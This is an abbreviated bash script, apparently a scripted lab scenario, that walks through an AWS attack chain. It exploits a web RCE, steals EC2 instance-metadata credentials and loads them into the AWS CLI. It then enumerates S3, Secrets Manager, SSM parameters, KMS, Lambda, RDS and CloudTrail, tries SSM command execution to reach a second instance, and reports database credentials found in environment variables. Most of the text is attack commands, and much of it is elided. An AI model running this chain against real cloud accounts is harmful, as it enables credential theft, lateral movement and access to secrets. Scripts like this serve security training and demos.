...
banner() {
  ...
  printf "  • Step 1. Explotation of Web RCE, IMDS stealing on EC2a\n"
...
#############################################
# Step 1. Explotation of Web RCE, IMDS stealing
#############################################
printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Explotation of Web RCE, IMDS stealing  ===" "${RESET}"
is_valid_ipv4() {
...
step "Verification of explotation: $TARGET?c=id"
...
aws configure set aws_access_key_id     "$AKID"   --profile default
aws configure set aws_secret_access_key "$SECK"   --profile default
aws configure set aws_session_token     "$SESS"   --profile default
aws configure set region                us-east-1 --profile default   # adjust if needed
spin_stop
printf "\n"
...
# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity
aws sts get-caller-identity
try "List account aliases"  aws iam list-account-aliases

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5
aws ec2 describe-instances \
  ...
  --output table
try "S3 ListAllMyBuckets"   aws s3api list-buckets
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5
try "SSM DescribeInstances" aws ssm describe-instance-information
try "KMS ListKeys"          aws kms list-keys --limit 5
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5
try "DDB ListTables"        aws dynamodb list-tables --max-items 5
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails
...
printf "We are goint to validate two more permissions which may give us direct access to EC2b\n"
read IID AZ PUBIP <<<"$(aws ec2 describe-instances \
...
ssm_probe() {
  ...
  if [ $rc -eq 0 ]; then
    ...
    aws ssm get-command-invocation --command-id "${cmdId}" --instance-id "$iid" --output table || true
...
ok "There were DB credentials stored in environment variables:"
...
read -r -p "Scenario successfully complited. Press Enter or Ctrl+C to exit" _ || true